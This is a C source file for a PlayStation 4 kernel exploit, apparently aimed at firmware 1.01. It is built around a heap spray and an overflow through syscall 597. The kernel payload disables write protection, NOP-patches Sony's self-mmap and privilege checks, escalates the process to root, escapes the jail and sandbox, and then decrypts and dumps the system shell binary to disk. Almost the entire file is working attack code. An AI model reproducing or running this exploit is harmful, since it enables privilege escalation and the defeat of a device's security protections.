
#include "ps4.h"

#define DEBUG_SOCKET

#include "defines.h"
#include "elf64.h"

#define TRUE 1
#define FALSE 0

static int sock;
static void *dump;

// dump file functions

typedef struct {
    int index;
    uint64_t fileoff;
    size_t bufsz;
    size_t filesz;
} SegmentBufInfo;


void hexdump(uint8_t *raw, size_t size) {
    for (int i = 1; i <= size; i += 1) {
        printfsocket("%02X ", raw[i - 1]);
        if (i % 16 == 0) {
            printfsocket("\n");
        }
    }
}


void print_phdr(Elf64_Phdr *phdr) {
    printfsocket("=================================\n");
    printfsocket("     p_type %08x\n", phdr->p_type);
    printfsocket("     p_flags %08x\n", phdr->p_flags);
    printfsocket("     p_offset %016llx\n", phdr->p_offset);
    printfsocket("     p_vaddr %016llx\n", phdr->p_vaddr);
    printfsocket("     p_paddr %016llx\n", phdr->p_paddr);
    printfsocket("     p_filesz %016llx\n", phdr->p_filesz);
    printfsocket("     p_memsz %016llx\n", phdr->p_memsz);
    printfsocket("     p_align %016llx\n", phdr->p_align);
}


void dumpfile(char *name, uint8_t *raw, size_t size) {
    FILE *fd = fopen(name, "wb");
    if (fd != NULL) {
        fwrite(raw, 1, size, fd);
        fclose(fd);
    }
    else {
        printfsocket("dump err.\n");
    }
}


int read_decrypt_segment(int fd, uint64_t index, uint64_t offset, size_t size, uint8_t *out) {
    uint64_t realOffset = (index << 32) | offset;
    uint8_t *addr = (uint8_t*)mmap(0, size, PROT_READ, MAP_PRIVATE | 0x80000, fd, realOffset);
    if (addr != MAP_FAILED) {
        memcpy(out, addr, size);
        munmap(addr, size);
        return TRUE;
    }
    else {
        printfsocket("mmap segment [%d] err(%d) : %s\n", index, errno, strerror(errno));
        return FALSE;
    }
}



int is_segment_in_other_segment(Elf64_Phdr *phdr, int index, Elf64_Phdr *phdrs, int num) {
    for (int i = 0; i < num; i += 1) {
        Elf64_Phdr *p = &phdrs[i];
        if (i != index) {
            if (p->p_filesz > 0) {
                // printfsocket("offset : %016x,  toffset : %016x\n", phdr->p_offset, p->p_offset);
                // printfsocket("offset : %016x,  toffset + size : %016x\n", phdr->p_offset, p->p_offset + p->p_filesz);
                if ((phdr->p_offset >= p->p_offset) && ((phdr->p_offset + phdr->p_filesz) <= (p->p_offset + p->p_filesz))) {
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}


SegmentBufInfo *parse_phdr(Elf64_Phdr *phdrs, int num, int *segBufNum) {
    printfsocket("segment num : %d\n", num);
    SegmentBufInfo *infos = (SegmentBufInfo *)malloc(sizeof(SegmentBufInfo) * num);
    int segindex = 0;
    for (int i = 0; i < num; i += 1) {
        Elf64_Phdr *phdr = &phdrs[i];
        // print_phdr(phdr);

        if (phdr->p_filesz > 0 && phdr->p_type != 0x6fffff01) {
            if (!is_segment_in_other_segment(phdr, i, phdrs, num)) {
                SegmentBufInfo *info = &infos[segindex];
                segindex += 1;
                info->index = i;
                info->bufsz = (phdr->p_filesz + (phdr->p_align - 1)) & (~(phdr->p_align - 1));
                info->filesz = phdr->p_filesz;
                info->fileoff = phdr->p_offset;

                // printfsocket("seg buf info %d -->\n", segindex);
                // printfsocket("    index : %d\n    bufsz : 0x%016llX\n", info->index, info->bufsz);
                // printfsocket("    filesz : 0x%016llX\n    fileoff : 0x%016llX\n", info->filesz, info->fileoff);
            }
        }
    }
    *segBufNum = segindex;
    return infos;
}


void do_dump(char *saveFile, int fd, SegmentBufInfo *segBufs, int segBufNum, Elf64_Ehdr *ehdr) {
    FILE *sf = fopen(saveFile, "wb");
    if (sf != NULL) {
        size_t elfsz = 0x40 + ehdr->e_phnum * sizeof(Elf64_Phdr);
        printfsocket("elf header + phdr size : 0x%08X\n", elfsz);
        fwrite(ehdr, elfsz, 1, sf);

        for (int i = 0; i < segBufNum; i += 1) {
            printfsocket("sbuf index : %d, offset : 0x%016x, bufsz : 0x%016x, filesz : 0x%016x\n", segBufs[i].index, segBufs[i].fileoff, segBufs[i].bufsz, segBufs[i].filesz);
            uint8_t *buf = (uint8_t*)malloc(segBufs[i].bufsz);
            memset(buf, 0, segBufs[i].bufsz);
            if (read_decrypt_segment(fd, segBufs[i].index, 0, segBufs[i].filesz, buf)) {
                fseek(sf, segBufs[i].fileoff, SEEK_SET);
                fwrite(buf, segBufs[i].bufsz, 1, sf);
            }
            free(buf);
        }
        fclose(sf);
    }
    else {
        printfsocket("fopen %s err : %s\n", saveFile, strerror(errno));
    }
}


void decrypt_and_dump_self(char *selfFile, char *saveFile) {
    int fd = open(selfFile, O_RDONLY,0);
    if (fd != -1) {
        void *addr = mmap(0, 0x4000, PROT_READ, MAP_PRIVATE, fd, 0);
        if (addr != MAP_FAILED) {
            printfsocket("mmap %s : %p\n", selfFile, addr);

            uint16_t snum = *(uint16_t*)((uint8_t*)addr + 0x18);
            Elf64_Ehdr *ehdr = (Elf64_Ehdr *)((uint8_t*)addr + 0x20 + snum * 0x20);
            printfsocket("ehdr : %p\n", ehdr);

            Elf64_Phdr *phdrs = (Elf64_Phdr *)((uint8_t *)ehdr + 0x40);
            printfsocket("phdrs : %p\n", phdrs);

            int segBufNum = 0;
            SegmentBufInfo *segBufs = parse_phdr(phdrs, ehdr->e_phnum, &segBufNum);
            do_dump(saveFile, fd, segBufs, segBufNum, ehdr);
            printfsocket("dump completed\n");

            free(segBufs);
            munmap(addr, 0x4000);
        }
        else {
            printfsocket("mmap file %s err : %s\n", selfFile, strerror(errno));
        }
    }
    else {
        printfsocket("open %s err : %s\n", selfFile, strerror(errno));
    }
}

// dlclose payload funtions

void payload(struct knote *kn) {
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833DC96E;
	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

	// Print test message to the UART line
	printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");

	// Disable write protection
	uint64_t cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);
	
	
	// patches to allow self loading on 1.01 for decryption. * offsets subbed by 0x1B6AF8 for alignment
	
	// patch invokecheck error -13(0xfffffff3) to be 0 for decryting root selfs, may not work first time but 2nd try does it.
	
	*(uint32_t *)0xFFFFFFFF827e82f6 = 0x00000000;
	*(uint32_t *)0xFFFFFFFF827e8316 = 0x00000000;
	
	
	// bomb sceSblACMgrIsAllowedToMmapSelf with NOP bombs so it skips to return 1
	*(uint32_t *)0xFFFFFFFF8264F460 = 0x90909090; 
	*(uint16_t *)0xFFFFFFFF8264F464 = 0x9090;
	*(uint32_t *)0xFFFFFFFF8264F46B = 0x90909090; 

	// tid patch 1.01
	*(char *)0xFFFFFFFF833DC975 = 0x82; // devkit patch cause why the hell not
	
	// Restore write protection
	writeCr0(cr0);
	
	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process
	
	((uint64_t *)0xFFFFFFFF83384188)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
	((uint64_t *)0xFFFFFFFF8324ACE8)[0] = 0; // bypass priv_check

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83244740; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF833A7750;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;
}

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}

void *exploitThread(void *none) {
	printfsocket("[+] Entered exploitThread\n");

	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;
	uint64_t copySize = bufferSize + overflowSize;
	
	// Round up to nearest multiple of PAGE_SIZE
	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
	
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	
	uint8_t *buffer = mapping + mappingSize - copySize;
	
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(buffer + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {
		0x58, // pop rax
		0x48, 0xB8, 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xFFFFFFFF82467D59 on 1.01 //0xFFFFFFFF82403919 1.76
		0x50, // push rax
		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
		0xFF, 0xE0 // jmp rax
	};


	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(void **)(trampw + 14) = (void *)payload;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	printfsocket("[+] Creating %d sockets\n", fd);

	// Create sockets
	for(int i = 0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i + 1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i = 0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
		printfsocket("[+] allocation = %llp\n", allocation[i]);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Perform the overflow
	int result = syscall(597, 1, mapping, &count);
	printfsocket("[+] Result: %d\n", result);

	// Execute the payload
	printfsocket("[+] Freeing m2\n");
	kernelFree(m2);
	
	// Close sockets
	for(int i = 0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}
	
	// Free allocations
	for(int i = 0; i < 50; i++) {
		kernelFree(allocation[i]);
	}
	
	// Free the mapping
	munmap(mapping, mappingSize);
	
	return NULL;
}

int _main(void) {
	ScePthread thread;

	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

#ifdef DEBUG_SOCKET
	struct sockaddr_in server;

	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 67);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	
	dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
#endif

	printfsocket("[+] Starting...\n");
	printfsocket("[+] UID = %d\n", getuid());
	printfsocket("[+] GID = %d\n", getgid());
	
	
	if(getuid() != 0){
		// Create exploit thread
		if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
			printfsocket("[-] pthread_create error\n");
			return 0;
		}

		// Wait for thread to exit
		scePthreadJoin(thread, NULL);

		// At this point we should have root and jailbreak
		if(getuid() != 0) {
			printfsocket("[-] Kernel patch failed!\n");
			sceNetSocketClose(sock);
			return 1;
		}

		printfsocket("[+] Kernel patch success!\n");
	}

	// decrypt whatever you like ;)
	decrypt_and_dump_self("/system/vsh/SceShellCore.elf", "/user/SceShell.elf");
		
	
#ifdef DEBUG_SOCKET
	munmap(dump, PAGE_SIZE);	
#endif
	
	printfsocket("[+] bye\n");
	sceNetSocketClose(sock);
	
	return 0;
}
